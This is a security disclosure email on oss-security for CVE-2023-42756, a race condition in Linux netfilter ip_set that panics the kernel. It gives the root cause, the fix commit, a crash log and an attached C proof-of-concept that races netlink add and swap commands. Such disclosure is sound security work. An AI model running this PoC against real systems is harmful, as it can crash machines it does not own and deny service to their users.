Received: (qmail 7490 invoked by uid 550); 27 Sep 2023 20:50:37 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 1500 invoked from network); 27 Sep 2023 20:45:03 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20230601; t=1695847491; x=1696452291; darn=lists.openwall.com;
        h=content-disposition:mime-version:message-id:subject:to:from:date
         :from:to:cc:subject:date:message-id:reply-to;
        bh=AAKyV+nyXH2v+ZedbZXwifLTItQv/+abSQNIhSsEcY0=;
        b=X0nrYZWXzAYqTDc/uvClQBDR2nXopkgPf6/7YRANVo8WXDTXcP9qlYZBqxNsuq5les
         4yOWDZNpKJvaCk6zHfmdRdKqWi+SBWXlA539TOKFXShs1nOSJHpLJQDZd90Ft40xZhnr
         UeEgqwboSnbm7iffET50gZHTRYwO3YhnY06O6dt8ZAACqDSlZTNToUZhCyqsp0aN6OBw
         lDYaxzaRC9xbSoLzmmpUysX4e9bGXYJ0LluhHW0Abf29GIrjytlUvUPz9yLjXfwySAbH
         FaJbfYO41KDKlRunYv9TdbCK49efMGLrk+UZ7DegMY7ZZ3FRwNbOEDBUUTWjR/l1yxlv
         5IWw==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20230601; t=1695847491; x=1696452291;
        h=content-disposition:mime-version:message-id:subject:to:from:date
         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
        bh=AAKyV+nyXH2v+ZedbZXwifLTItQv/+abSQNIhSsEcY0=;
        b=RyqHmpeYkR5fUWlTT92s/EDJj1GvQyA8BHMhA5VOPR6pYJBv2OcL+8Rj8J1ZOc1k3U
         EZeealgxR4xoUosMioynzaTaD4aJ8p9tBvuWBsOnMJgT7HfVj2WJm5p2UqsDDTPx0HfH
         2cXuzAtNg/73+C5I3HPVIDkpopDtONtFLzUyuvtwjJbcBWKDWCD6LzWlQ0GOeKiYT+rL
         rQDAkwIzWDRsout1VIkXp5brGXjhYjVrzez00o3HZLId9UPeVqoHy/Y3Rso2CiMT2zUe
         7bNnI7aYc7dWmuZaXoleefSC4zl8jhun48tk0y9QzZw1/wnDJBOP2h2QHlCOLP0AD027
         nSCQ==
X-Gm-Message-State: AOJu0YzJ0RQqW9WvdPypmV7v0BLOEXJuZO3iEuqPj38L4q6vJ9eoWvfn
	Up0Pidl6AHyBZ8sNYIXOnI1Otb+Jq8hIYQ==
X-Google-Smtp-Source: AGHT+IGdPECAfG6IlxKkBSfECuYI6e7ulYlZk/Ui/l8XcqTYdZh/BkGvKpRHoFRL7KkN/JcN+Up1EA==
X-Received: by 2002:a05:6300:800a:b0:154:b4cb:2e8c with SMTP id an10-20020a056300800a00b00154b4cb2e8cmr2898279pzc.24.1695847491423;
        Wed, 27 Sep 2023 13:44:51 -0700 (PDT)
Date: Wed, 27 Sep 2023 13:44:48 -0700
From: Kyle Zeng <zengyhkyle@gmail.com>
To: oss-security@lists.openwall.com
Message-ID: <ZRSUQPPuoCdY+fGP@westworld>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="3e+dTAuW709lDQ9N"
Content-Disposition: inline
Subject: [oss-security] [CVE-2023-42756] Linux kernel race condition in netfilter

--3e+dTAuW709lDQ9N
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

Hi there,

I recently found a race condition bug in the Linux kernel between
IPSET_CMD_ADD and IPSET_CMD_SWAP in netfilter/ip_set, which can
lead to the invocation of `__ip_set_put` on a wrong `set`, triggering
the `BUG_ON(set->ref == 0);` check in it, which leads to local DoS.
I confirm it at least affect upstream, v6.5.rc7, v6.1, and v5.10.

[Root Cause]
The bug is in the netfilter subsystem.
In `ip_set_swap` function, it will hold the `ip_set_ref_lock`
and then do the following to swap the sets:
~~~
        strncpy(from_name, from->name, IPSET_MAXNAMELEN);
        strncpy(from->name, to->name, IPSET_MAXNAMELEN);
        strncpy(to->name, from_name, IPSET_MAXNAMELEN);

        swap(from->ref, to->ref);
~~~
But in the retry loop in `call_ad`:
~~~
                if (retried) {
                        __ip_set_get(set);
                        nfnl_unlock(NFNL_SUBSYS_IPSET);
                        cond_resched();
                        nfnl_lock(NFNL_SUBSYS_IPSET);
                        __ip_set_put(set);
                }
~~~
No lock is hold when it does the `cond_resched()`.
As a result, `ip_set_ref_lock` (in thread 2) can swap the set with
another when thread 1 is doing the `cond_resched()`. When thread 1
wakes up, the `set` variable alreays means another `set`, calling
`__ip_set_put` on it will decrease the refcount on the wrong `set`,
triggering the `BUG_ON` call.

According to Jozsef Kadlecsik, who fixed the bug, the root cause is that
the `call_ad` function is using a wrong ref counter. Instead of using
`__ip_set_get`, which operates on `set->ref`, the correct way is to
operate on `set->ref_netlink`.

[Severity]
It will invoke a `BUG_ON` call, leading to kernel panic.
In other words, it will lead to local DoS.

[Patch]
Jozsef Kadlecsik prepared a patch and it got merged into mainline and
stables already.
The patch can be found here:
https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=7433b6d2afd512d04398c73aa984d1e285be125b

[Proof-of-Concept]
A proof-of-concept code to trigger the bug is attached to this email.

Best,
Kyle

========================================================================
[    5.110096] ------------[ cut here ]------------
[    5.110337] kernel BUG at net/netfilter/ipset/ip_set_core.c:677!
[    5.110618] invalid opcode: 0000 [#1] PREEMPT SMP KASAN NOPTI
[    5.110892] CPU: 2 PID: 507 Comm: poc Not tainted 6.1.47+ #67
[    5.111143] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
[    5.111490] RIP: 0010:call_ad+0x83e/0x850
[    5.111677] Code: 89 df e8 35 c6 d2 fd e9 d4 fd ff ff 44 89 f9 80 e1 07 80 c1 03 38 c1 0f 8c d7 fd ff ff 4c 89 ff e8 a7 c5 d2 fd e9 ca fd ff ff <0f> 0b e8 0b 09 85 00 66 2e 0f 1f 84 00 00 00 00 00 90 0f 1f 44 00
[    5.112481] RSP: 0018:ffff88800c4d7350 EFLAGS: 00010246
[    5.112718] RAX: 0000000000000000 RBX: 0000000000000000 RCX: 00000000000000ff
[    5.113047] RDX: ffff88800b658324 RSI: 0000000000000004 RDI: ffff88800c4d7314
[    5.113373] RBP: ffff88800c4d7448 R08: dffffc0000000000 R09: ffffed100189ae63
[    5.113696] R10: dfffe9100189ae64 R11: 1ffff1100189ae62 R12: dffffc0000000000
[    5.114024] R13: 1ffff110016cb067 R14: ffff88800b658338 R15: ffffffff8557d401
[    5.114346] FS:  00000000027203c0(0000) GS:ffff888034f00000(0000) knlGS:0000000000000000
[    5.114745] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    5.115049] CR2: 000000000046c280 CR3: 000000000d71c005 CR4: 0000000000770ee0
[    5.115478] PKRU: 55555554
[    5.115653] Call Trace:
[    5.115799]  <TASK>
[    5.115923]  ? __die_body+0x67/0xb0
[    5.116125]  ? die+0xa0/0xc0
[    5.116295]  ? do_trap+0x124/0x350
[    5.116485]  ? call_ad+0x83e/0x850
[    5.116670]  ? call_ad+0x83e/0x850
[    5.116855]  ? handle_invalid_op+0x96/0xd0
[    5.117084]  ? call_ad+0x83e/0x850
[    5.117270]  ? exc_invalid_op+0x2f/0x40
[    5.117453]  ? asm_exc_invalid_op+0x16/0x20
[    5.117633]  ? call_ad+0x83e/0x850
[    5.117782]  ip_set_ad+0x68e/0x7d0
[    5.117932]  ? mutex_lock+0x76/0xc0
[    5.118083]  nfnetlink_rcv_msg+0x6a7/0x830
[    5.118262]  netlink_rcv_skb+0x15a/0x330
[    5.118430]  ? nfnetlink_unbind+0x180/0x180
[    5.118632]  nfnetlink_rcv+0x22d/0x1e70
[    5.118797]  ? __stack_depot_save+0x35/0x480
[    5.118982]  ? kasan_set_track+0x61/0x70
[    5.119150]  ? kasan_set_track+0x4c/0x70
[    5.119318]  ? __kasan_kmalloc+0x85/0x90
[    5.119486]  ? netlink_sendmsg+0x509/0xa00
[    5.119660]  ? __sys_sendto+0x494/0x4b0
[    5.119826]  ? __x64_sys_sendto+0xda/0xf0
[    5.119998]  ? do_syscall_64+0x67/0x90
[    5.120159]  ? entry_SYSCALL_64_after_hwframe+0x63/0xcd
[    5.120383]  ? __netlink_lookup+0x2fa/0x310
[    5.120562]  netlink_unicast+0x675/0x8a0
[    5.120731]  netlink_sendmsg+0x685/0xa00
[    5.120902]  ? netlink_getsockopt+0x3f0/0x3f0
[    5.121093]  __sys_sendto+0x494/0x4b0
[    5.121264]  __x64_sys_sendto+0xda/0xf0
[    5.121438]  do_syscall_64+0x67/0x90
[    5.121628]  ? exit_to_user_mode_prepare+0x12/0xa0
[    5.121874]  entry_SYSCALL_64_after_hwframe+0x63/0xcd
[    5.122142] RIP: 0033:0x475b30
[    5.122305] Code: c0 ff ff ff ff eb b9 0f 1f 00 f3 0f 1e fa 41 89 ca 64 8b 04 25 18 00 00 00 85 c0 75 1d 45 31 c9 45 31 c0 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 68 c3 0f 1f 80 00 00 00 00 41 54 48 83 ec 20
[    5.123328] RSP: 002b:00007ffc64795c98 EFLAGS: 00000246 ORIG_RAX: 000000000000002c
[    5.123741] RAX: ffffffffffffffda RBX: 00007ffc64795f48 RCX: 0000000000475b30
[    5.124512] RDX: 000000000000007c RSI: 00000000027244a0 RDI: 0000000000000005
[    5.124905] RBP: 00007ffc64795d40 R08: 0000000000000000 R09: 0000000000000000
[    5.125416] R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000001
[    5.125860] R13: 00007ffc64795f38 R14: 0000000000500740 R15: 0000000000000002
[    5.126282]  </TASK>
[    5.126408] Modules linked in:
[    5.126613] ---[ end trace 0000000000000000 ]---
[    5.127317] RIP: 0010:call_ad+0x83e/0x850
[    5.127565] Code: 89 df e8 35 c6 d2 fd e9 d4 fd ff ff 44 89 f9 80 e1 07 80 c1 03 38 c1 0f 8c d7 fd ff ff 4c 89 ff e8 a7 c5 d2 fd e9 ca fd ff ff <0f> 0b e8 0b 09 85 00 66 2e 0f 1f 84 00 00 00 00 00 90 0f 1f 44 00
[    5.128567] RSP: 0018:ffff88800c4d7350 EFLAGS: 00010246
[    5.128928] RAX: 0000000000000000 RBX: 0000000000000000 RCX: 00000000000000ff
[    5.129356] RDX: ffff88800b658324 RSI: 0000000000000004 RDI: ffff88800c4d7314
[    5.129766] RBP: ffff88800c4d7448 R08: dffffc0000000000 R09: ffffed100189ae63
[    5.130203] R10: dfffe9100189ae64 R11: 1ffff1100189ae62 R12: dffffc0000000000
[    5.130602] R13: 1ffff110016cb067 R14: ffff88800b658338 R15: ffffffff8557d401
[    5.130973] FS:  00000000027203c0(0000) GS:ffff888034f00000(0000) knlGS:0000000000000000
[    5.131454] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    5.131809] CR2: 000000000046c280 CR3: 000000000d71c005 CR4: 0000000000770ee0
[    5.132290] PKRU: 55555554
[    5.132452] Kernel panic - not syncing: Fatal exception in interrupt
[    5.133092] Kernel Offset: disabled
[    5.133320] Rebooting in 1000 seconds..

--3e+dTAuW709lDQ9N
Content-Type: text/x-csrc; charset=us-ascii
Content-Disposition: attachment; filename="poc.c"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <time.h>
#include <unistd.h>

#include <assert.h>
#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/netfilter/nfnetlink.h>

#include <stdint.h>

int nl_sock;

void *build_pkt(struct nlmsghdr *hdr, struct nfgenmsg *nfgenmsg, void *attrs, int attr_len)
{
    void *payload = calloc(1, 0x1000);
    void *ptr = payload;
    hdr->nlmsg_len = sizeof(struct nlmsghdr) + sizeof(struct nfgenmsg) + attr_len;
	//printf("%#x %#x %#x\n", sizeof(struct nlmsghdr), sizeof(struct nfgenmsg), attr_len);
    //printf("nlmsg_len: %#x\n", hdr->nlmsg_len);
    //printf("attr_len: %#x\n", attr_len);

    memcpy(ptr, hdr, sizeof(struct nlmsghdr));
    ptr += sizeof(struct nlmsghdr);
    memcpy(ptr, nfgenmsg, sizeof(struct nfgenmsg));
    ptr += sizeof(struct nfgenmsg);
    memcpy(ptr, attrs, attr_len);
    return payload;
}

void func1()
{
	struct nlmsghdr nlmsghdr = {
		.nlmsg_len = 0,
		.nlmsg_type = 0x609, // IPSET_CMD_ADD(9)  | subsys_id = NFNL_SUBSYS_IPSET(6)
		.nlmsg_flags = 1, // NLM_F_REQUEST(1)
		.nlmsg_seq = 0, // NL_AUTO_SEQ
		.nlmsg_pid = 0 // NL_AUTO_PID
	};

	struct nfgenmsg nfgenmsg = {
		.nfgen_family = 0,
		.version = 0,
		.res_id = 0
	};

	char attrs[] =	"\x05\x00""\x01\x00""\x07\x00\x00\x00"		// IPSET_ATTR_PROTOCO, protocol is hardcoded to 7
					"\x09\x00""\x02\x00""set2\x00\x00\x00\x00"	// IPSET_ATTR_SETNAME
					"\x54\x00""\x07\x80"						// IPSET_ATTR_DATA
						"\x06\x00""\x04\x40""\x00\x00\x00\x00"	// IPSET_ATTR_PORT_FROM
						"\x06\x00""\x05\x40""\x4e\x00\x00\x00"	// IPSET_ATTR_PORT_TO
						"\x05\x00""\x07\x00""\x11\x00\x00\x00"	// IPSET_ATTR_PROTO => IPPROTO_UDP, just a protocol that has ports (ip_set_proto_with_ports)
						"\x08\x00""\x08\x40""\x00\x00\x00\x00"
						"\x18\x00""\x14\x80"
							"\x14\x00""\x02\x40""\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xaa"
						"\x18\x00""\x01\x80"
							"\x14\x00""\x02\x40""\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\xff\xff\x7f\x00\x00\x01";
	void *payload = build_pkt(&nlmsghdr, &nfgenmsg, attrs, sizeof(attrs)-1);
	send(nl_sock, payload, nlmsghdr.nlmsg_len, 0);
}

void func2()
{
	struct nlmsghdr nlmsghdr = {
		.nlmsg_len = 0,
		.nlmsg_type = 0x606, // IPSET_CMD_SWAP(6)  | subsys_id = NFNL_SUBSYS_IPSET(6)
		.nlmsg_flags = 1, // NLM_F_REQUEST(1)
		.nlmsg_seq = 0, // NL_AUTO_SEQ
		.nlmsg_pid = 0 // NL_AUTO_PID
	};

	struct nfgenmsg nfgenmsg = {
		.nfgen_family = 0,
		.version = 0,
		.res_id = 0
	};

	char attrs[] =	"\x09\x00""\x03\x00""set1\x00\x00\x00\x00"
					"\x05\x00""\x01\x00""\x07\x00\x00\x00"		// IPSET_ATTR_PROTOCO, protocol is hardcoded to 7
					"\x09\x00""\x02\x00""set2\x00\x00\x00\x00";

	void *payload = build_pkt(&nlmsghdr, &nfgenmsg, attrs, sizeof(attrs)-1);
	send(nl_sock, payload, nlmsghdr.nlmsg_len, 0);
}

void context_setup()
{
	nl_sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_NETFILTER);

	struct nlmsghdr nlmsghdr1 = {
		.nlmsg_len = 0,
		.nlmsg_type = 0x602, // IPSET_CMD_CREATE(2)  | subsys_id = NFNL_SUBSYS_IPSET(6)
		.nlmsg_flags = 0x1, // NLM_F_REQUEST(1)
		.nlmsg_seq = 0, // NL_AUTO_SEQ
		.nlmsg_pid = 0 // NL_AUTO_PID
	};

	struct nfgenmsg nfgenmsg1 = {
		.nfgen_family = 0,
		.version = 0,
		.res_id = 0
	};

	char attrs1[] =	"\x09\x00""\x02\x00""set2\x00\x00\x00\x00"
					"\x05\x00""\x04\x00""\x00\x00\x00\x00"					// IPSET_ATTR_REVISION
					"\x15\x00""\x03\x00""hash:ip,port,net\x00\x00\x00\x00"
					"\x05\x00""\x05\x00""\x0a\x00\x00\x00"					// IPSET_ATTR_FAMILY => NFPROTO_IPV6(0xa)
					"\x05\x00""\x01\x00""\x07\x00\x00\x00";

	void *payload1 = build_pkt(&nlmsghdr1, &nfgenmsg1, attrs1, sizeof(attrs1)-1);
	send(nl_sock, payload1, nlmsghdr1.nlmsg_len, 0);

	struct nlmsghdr nlmsghdr2 = {
		.nlmsg_len = 0,
		.nlmsg_type = 0x602, // IPSET_CMD_CREATE(2)  | subsys_id = NFNL_SUBSYS_IPSET(6)
		.nlmsg_flags = 0x1, // NLM_F_REQUEST(1)
		.nlmsg_seq = 0, // NL_AUTO_SEQ
		.nlmsg_pid = 0 // NL_AUTO_PID
	};

	struct nfgenmsg nfgenmsg2 = {
		.nfgen_family = 0,
		.version = 0,
		.res_id = 0
	};

	char attrs2[] =	"\x05\x00""\x05\x00""\x0a\x00\x00\x00"					// IPSET_ATTR_FAMILY => NFPROTO_IPV6(0xa)
					"\x09\x00""\x02\x00""set1\x00\x00\x00\x00"
					"\x15\x00""\x03\x00""hash:ip,port,net\x00\x00\x00\x00"
					"\x05\x00""\x04\x00""\x00\x00\x00\x00"					// IPSET_ATTR_REVISION
					"\x05\x00""\x01\x00""\x07\x00\x00\x00";

	void *payload2 = build_pkt(&nlmsghdr2, &nfgenmsg2, attrs2, sizeof(attrs2)-1);
	send(nl_sock, payload2, nlmsghdr2.nlmsg_len, 0);
}

int main(void)
{
	context_setup();
	if(!fork()) func1();
	if(!fork()) func2();
	getchar();
	return 0;
}

--3e+dTAuW709lDQ9N--
